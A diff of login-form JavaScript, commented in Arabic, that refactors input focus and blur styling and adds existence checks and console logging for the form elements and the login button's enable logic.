@@ -33,7 +33,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.getElementById('loginForm');
     const usernameInput = document.getElementById('username');
     const passwordInput = document.getElementById('password');
-    const loginButton = document.querySelector('.login-btn');
+    const loginButton = document.getElementById('loginBtn');
     
     // متغيرات لتتبع سلوك المستخدم
     let startTime = new Date().getTime(); // وقت بداية زيارة الصفحة
@@ -51,40 +51,46 @@ document.addEventListener('DOMContentLoaded', function() {
         // تطبيق تأثيرات على جميع حقول الإدخال
         const allInputs = document.querySelectorAll('input[type="text"], input[type="password"]');
         
-        allInputs.forEach(function(input) {
+        if (loginForm && usernameInput && passwordInput && loginButton) {
+            console.log('✅ تم العثور على جميع عناصر النموذج');
             
-            // عند التركيز على الحقل (Focus)
-            input.addEventListener('focus', function() {
-                // إضافة كلاس CSS للتأثير البصري
-                this.parentElement.classList.add('input-focused');
-                // تغيير لون الحدود
-                this.style.borderColor = '#0095f6';
-                this.style.boxShadow = '0 0 0 1px #0095f6';
-            });
-            
-            // عند فقدان التركيز (Blur)
-            input.addEventListener('blur', function() {
-                // إزالة التأثير البصري إذا كان الحقل فارغاً
-                if (this.value.trim() === '') {
-                    this.parentElement.classList.remove('input-focused');
-                    this.style.borderColor = '#dbdbdb';
-                    this.style.boxShadow = 'none';
-                }
-            });
-            
-            // عند الكتابة في الحقل
-            input.addEventListener('input', function() {
-                // تتبع عدد الضربات للتحليل
-                keystrokes++;
+            // إضافة مستمعي الأحداث لكل حقل إدخال
+            [usernameInput, passwordInput].forEach(input => {
+                // تحسين المظهر عند التركيز على الحقل
+                input.addEventListener('focus', function() {
+                    this.style.borderColor = '#0095f6';
+                    this.style.boxShadow = '0 0 0 1px #0095f6';
+                });
                 
-                // تفعيل/تعطيل زر تسجيل الدخول حسب محتوى الحقول
-                toggleLoginButton();
+                // إرجاع المظهر الطبيعي عند فقدان التركيز
+                input.addEventListener('blur', function() {
+                    if (this.value === '') {
+                        this.style.borderColor = '#dbdbdb';
+                        this.style.boxShadow = 'none';
+                    }
+                });
                 
-                // إزالة رسائل الخطأ إن وجدت
-                clearErrorMessages();
+                // عند الكتابة في الحقل
+                input.addEventListener('input', function() {
+                    // تتبع عدد الضربات للتحليل
+                    keystrokes++;
+                    
+                    // تفعيل/تعطيل زر تسجيل الدخول حسب محتوى الحقول
+                    toggleLoginButton();
+                    
+                    // إزالة رسائل الخطأ إن وجدت
+                    clearErrorMessages();
+                });
+                
             });
-            
-        });
+        } else {
+            console.log('❌ لم يتم العثور على بعض عناصر النموذج:');
+            console.log('loginForm:', loginForm);
+            console.log('usernameInput:', usernameInput);
+            console.log('passwordInput:', passwordInput);
+            console.log('loginButton:', loginButton);
+        }
+        
     }
     
     // ========================================
@@ -92,6 +98,12 @@ document.addEventListener('DOMContentLoaded', function() {
     // ========================================
     
     function toggleLoginButton() {
+        // التحقق من وجود العناصر أولاً
+        if (!usernameInput || !passwordInput || !loginButton) {
+            console.log('⚠️ لم يتم العثور على عناصر النموذج');
+            return;
+        }
+        
         // التحقق من امتلاء الحقلين
         const usernameValue = usernameInput.value.trim();
         const passwordValue = passwordInput.value.trim();
